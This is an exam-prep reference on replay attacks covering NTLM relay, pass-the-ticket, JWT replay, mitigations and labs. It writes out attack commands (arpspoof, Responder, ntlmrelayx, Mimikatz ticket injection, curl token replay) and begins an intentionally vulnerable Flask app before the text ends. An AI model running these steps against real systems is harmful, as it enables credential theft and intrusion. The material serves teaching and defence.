---
domain: "network security"
tags: [replay-attack, authentication, cryptography, network-attacks, protocols, identity]
---
# Replay Attack

A **replay attack** (also called a **playback attack**) occurs when a threat actor intercepts a valid authentication credential or data transmission and retransmits it later to gain unauthorized access or repeat a transaction. Unlike many attacks that require cracking or forging credentials, replay attacks exploit the **temporal validity** of captured tokens, making them particularly dangerous against systems that lack proper message freshness controls. They are closely related to [[man-in-the-middle attack]] and [[credential theft]] techniques.

---

## Overview

Replay attacks exploit a fundamental weakness in authentication and communication protocols: if a valid message is captured in transit, it may remain valid long after the original exchange. The attacker does not need to understand or decrypt the content — they only need to retransmit it faithfully. This makes replay attacks passive-to-active in nature: the attacker begins with passive [[packet capture]] and then pivots to active exploitation by injecting the previously captured traffic.

The attack is ancient in concept but remains relevant in modern infrastructure. Early NTLM-based Windows authentication was famously vulnerable to pass-the-hash and credential relay attacks, both of which are forms of replay. Kerberos was designed in part to mitigate replay attacks through the use of timestamps and ticket expiration, but even Kerberos has been exploited via techniques like Pass-the-Ticket when the ticket-granting tickets (TGTs) themselves are stolen.

In financial systems, replay attacks can result in duplicate transactions. A captured HTTP request that transfers funds, if replayed against a server without idempotency controls, may execute the transfer multiple times. The SWIFT banking network has been targeted by attacks that partially relied on replaying transaction messages. Web application tokens — including [[JWT (JSON Web Token)]] and OAuth access tokens — are also susceptible if not properly bounded by expiration and nonce validation.

The attack surface for replay attacks is broad: wireless authentication (WPA2 TKIP had replay vulnerabilities), VoIP session initiation, IPsec without anti-replay enabled, and legacy industrial control systems using static commands over serial or UDP channels. In all these cases, the attacker's leverage comes from the absence of a mechanism that ties a message to a unique moment in time or a single-use secret.

---

## How It Works

### General Attack Flow

```
[Legitimate Client] ---AUTH REQUEST---> [Server]
        |
  [Attacker sniffs traffic via ARP spoofing, promiscuous mode NIC, or MITM]
        |
  [Attacker captures the auth token/packet]
        |
  [Time passes — seconds, minutes, hours]
        |
[Attacker] ---REPLAYED AUTH REQUEST---> [Server]
        |
  [Server accepts the token as valid if no anti-replay mechanism exists]
        |
  [Attacker gains access / transaction executes]
```

### Step-by-Step Technical Walkthrough

**Step 1: Positioning and Capture**
The attacker positions themselves on the network to capture traffic. This is done via:
- ARP poisoning using `arpspoof` or Ettercap on a switched LAN
- Promiscuous mode NIC capture on a hub or mirrored switch port
- Rogue access point for wireless targets
- Compromised network tap or span port

```bash
# ARP poison to intercept traffic between 192.168.1.10 and the gateway
sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.10

# Capture traffic with tcpdump
sudo tcpdump -i eth0 -w captured.pcap
```

**Step 2: Isolating the Authentication Material**
The attacker analyzes the capture to locate authentication tokens. For NTLM, this is the Net-NTLMv2 hash exchange. For web apps, it may be a session cookie or Bearer token in an HTTP Authorization header.

```bash
# Use Wireshark display filter to isolate NTLM exchanges
# Filter: ntlmssp

# Or use tshark from the command line
tshark -r captured.pcap -Y "http.authorization" -T fields -e http.authorization
```

**Step 3: Replaying the Credential**

*Example: NTLM Relay Attack (a form of credential replay)*
```bash
# Responder captures Net-NTLMv2 hashes
sudo python3 Responder.py -I eth0 -rdw

# NTLMRelayX replays the captured hash against a target
sudo python3 ntlmrelayx.py -t smb://192.168.1.50 -smb2support
```

*Example: Replaying a stolen JWT token*
```bash
# Attacker has captured a JWT from sniffed traffic
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

# Replay it against the API
curl -H "Authorization: Bearer $TOKEN" https://api.target.local/admin/users
```

*Example: Kerberos Pass-the-Ticket*
```bash
# Export a TGT from memory using Mimikatz
sekurlsa::tickets /export

# Inject the ticket into the current session
kerberos::ptt [0;3e7]-0-0-40e10000-Administrator@krbtgt-CORP.LOCAL.kirbi
```

**Step 4: Exploitation**
With a replayed token, the attacker accesses resources as the original user, executes transactions, or escalates privileges — depending on the value of the captured credential.

### Protocol-Specific Vulnerabilities

| Protocol | Vulnerability | Mitigation |
|---|---|---|
| NTLM | Net-NTLMv2 relay | SMB Signing, Kerberos preference |
| Kerberos | TGT/TGS theft | Short ticket lifetimes, credential guard |
| WPA2-TKIP | Michael MIC replay | Upgrade to WPA2-CCMP/AES or WPA3 |
| HTTP | Session token replay | HTTPS, token expiry, binding to IP |
| IPsec | Without anti-replay window | Enable anti-replay in ESP configuration |

---

## Key Concepts

- **Nonce**: A **n**umber used **once** — a random or pseudo-random value included in authentication protocols to ensure each exchange is cryptographically unique. If a nonce is not present or is predictable, replay becomes trivial.
- **Timestamp-based freshness**: A mechanism, used prominently in [[Kerberos]], where authentication messages include a current timestamp. Messages older than a defined skew tolerance (typically ±5 minutes) are rejected, limiting replay windows.
- **Challenge-Response Authentication**: A protocol design where the server sends a **unique challenge** per session and the client's response is mathematically bound to that challenge. This invalidates pre-captured responses against future challenges.
- **Anti-replay window (IPsec)**: A sliding window mechanism in [[IPsec ESP]] that tracks sequence numbers of received packets. Packets with sequence numbers below the window or already seen are discarded, preventing retransmission attacks.
- **Session token binding**: Cryptographically or logically binding an authentication token to a specific **TLS session, IP address, or device fingerprint**, ensuring the token cannot be used from a different context.
- **Idempotency**: In API and financial system design, **idempotency keys** ensure that replaying the same request produces the same result without executing side effects (like a payment) more than once.
- **Pass-the-Hash / Pass-the-Ticket**: Specific replay attack variants in Windows environments where the attacker replays a password **hash (NTLM)** or **Kerberos ticket** without ever knowing the plaintext password.

---

## Exam Relevance

**SY0-701 Domain Mapping**: Replay attacks appear primarily in:
- **Domain 1.0 – Threats, Attacks and Vulnerabilities** (1.2 – Attack Types)
- **Domain 3.0 – Implementation** (3.3 – Cryptographic protocols and their purpose)

**Common Question Patterns:**

1. *"Which of the following BEST mitigates a replay attack?"*
   → Correct answers typically involve: **nonces, timestamps, sequence numbers, or challenge-response protocols**. Watch for distractors like encryption (encryption alone does not prevent replay — the ciphertext itself can be replayed).

2. *"A user's authentication token was captured and used hours later to access a system. What type of attack occurred?"*
   → **Replay attack**. Not MITM (MITM involves intercepting and potentially modifying in real time, though it can enable replay).

3. *"Which protocol uses timestamps to prevent replay attacks?"*
   → **Kerberos**. The 5-minute clock skew tolerance is a Security+ classic.

**Key Gotchas:**
- **Encryption ≠ replay prevention**. HTTPS encrypts traffic but does not prevent a captured token from being reused. This is a frequent trap question.
- **NTLM relay is a replay attack**. Questions about lateral movement in Windows networks using captured hashes fall under replay attack taxonomy.
- **WPA2-TKIP** was deprecated partly due to replay vulnerabilities (the Michael algorithm's countermeasures could be bypassed). WPA3 is the exam-preferred modern answer.
- Distinguish **replay** (retransmit old message) from **reflection attack** (send message back to sender) — both may appear as distractors.

---

## Security Implications

### Attack Vectors
- **Local network interception**: Any protocol running over cleartext (HTTP, FTP, Telnet, legacy RADIUS with MD5) is immediately vulnerable to capture and replay.
- **Wireless networks**: 802.11 management frame replay can force re-authentication; TKIP-based WPA2 had documented replay vulnerabilities (CVE-2008-2701 and related Michael MIC attacks).
- **Active Directory environments**: NTLM relay attacks remain one of the most prevalent attack paths in corporate networks. Tools like Responder and NTLMRelayX automate the capture and replay process.
- **Web application sessions**: Stolen session cookies from [[cross-site scripting (XSS)]] or network interception can be replayed if not bound to IP, device, or TLS session.

### Notable CVEs and Incidents

- **CVE-2019-1040 (DropTheMIC)**: A vulnerability in Windows NTLM authentication that allowed MIC (Message Integrity Code) stripping, enabling relay attacks even when message signing was negotiated.
- **CVE-2021-36942 (PetitPotam)**: Allowed unauthenticated attackers to coerce Windows domain controllers to authenticate to attacker-controlled servers, enabling NTLM relay of DC credentials to services like AD CS — a devastating replay-enabled attack chain.
- **CVE-2008-2701**: Replay vulnerability in certain WPA implementations affecting TKIP.
- **2016 SWIFT Attacks**: The Bangladesh Bank heist ($81M stolen) involved attackers replaying and forging SWIFT transaction messages after compromising the bank's network, combining replay with message forgery.

---

## Defensive Measures

### Protocol and Configuration Controls

**1. Enable SMB Signing (prevents NTLM relay on Windows networks)**
```powershell
# Via Group Policy: Computer Configuration > Windows Settings >
# Security Settings > Local Policies > Security Options
# "Microsoft network server: Digitally sign communications (always)" -> Enabled

# Or via registry
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\LanManServer\Parameters" `
  -Name "RequireSecuritySignature" -Value 1
```

**2. Disable NTLM where possible, enforce Kerberos**
```powershell
# GPO: Computer Configuration > Windows Settings > Security Settings >
# Local Policies > Security Options
# "Network security: Restrict NTLM: NTLM authentication in this domain" -> Deny all
```

**3. Configure Kerberos ticket lifetimes tightly**
```
# Default Domain Policy -> Computer Configuration -> 
# Windows Settings -> Security Settings -> Account Policies -> Kerberos Policy
# Maximum lifetime for user ticket: 10 hours (default)
# Maximum lifetime for user ticket renewal: 7 days
# Maximum tolerance for computer clock synchronization: 5 minutes
```

**4. Enable IPsec Anti-Replay**
```bash
# In strongSwan ipsec.conf, anti-replay is enabled by default
# Verify with:
ip xfrm policy show
# Look for "replay-window" in SA parameters — default is 32 packets
```

**5. Use HTTPS with token expiration and binding**
```python
# Flask example: JWT with expiration and token binding
import jwt, datetime

payload = {
    "sub": "user123",
    "exp": datetime.datetime.utcnow() + datetime.timedelta(minutes=15),
    "jti": str(uuid.uuid4()),  # JWT ID — unique nonce for this token
    "iat": datetime.datetime.utcnow()
}
token = jwt.encode(payload, SECRET_KEY, algorithm="HS256")
```

**6. Implement API Idempotency Keys**
```http
POST /api/v1/payment HTTP/1.1
Host: api.example.com
Idempotency-Key: 550e8400-e29b-41d4-a716-446655440000
Content-Type: application/json

{"amount": 500, "currency": "USD", "to": "account_987"}
```

**7. Network Detection**
- Deploy [[IDS/IPS]] rules to detect NTLM relay tool signatures (Responder, NTLMRelayX)
- Monitor for duplicate authentication events from different source IPs using [[SIEM]] correlation rules
- Alert on Kerberos ticket usage from unusual source IPs (Pass-the-Ticket detection)

---

## Lab / Hands-On

### Lab 1: Observe NTLM Relay in a Controlled Environment

**Requirements**: Kali Linux, two Windows VMs (victim + target), isolated lab network

```bash
# On Kali: Start Responder in analyze mode first (non-destructive)
sudo python3 /usr/share/responder/Responder.py -I eth0 -A

# Trigger NTLM auth from Windows victim by browsing to a non-existent share
# On Windows victim:
# net use \\KALI_IP\fakeshare

# Observe captured Net-NTLMv2 hashes in Responder output
# Then demonstrate relay:
sudo python3 /usr/share/impacket/examples/ntlmrelayx.py \
  -t smb://TARGET_WINDOWS_IP -smb2support -i

# Connect to interactive SMB shell on successful relay
nc 127.0.0.1 11000
```

### Lab 2: Observe Anti-Replay in Wireshark (IPsec)

```bash
# Set up an IPsec tunnel between two Linux hosts
# Install strongSwan
sudo apt install strongswan

# Configure /etc/ipsec.conf with ESP and AH
# After tunnel is up, capture with tcpdump:
sudo tcpdump -i eth0 esp -w ipsec_capture.pcap

# Open in Wireshark, filter: esp
# Note the Sequence Number field in ESP headers — this is the anti-replay counter
```

### Lab 3: JWT Replay Demonstration

```bash
# Run a simple Flask app with no token expiry (intentionally vulnerable)
pip install flask pyjwt

cat > vuln_app.py << 'EOF'
from flask import Flask, request, jsonify
import jwt

app = Flask(__name__)
SECRET = "supersecret"

@app.route("/token")
def get_token():
    token = jwt.encode({"user": "alice"}, SECRET, algorithm="HS256")
    return jsonify({"token": token})

@app.route("/protected")
def protected():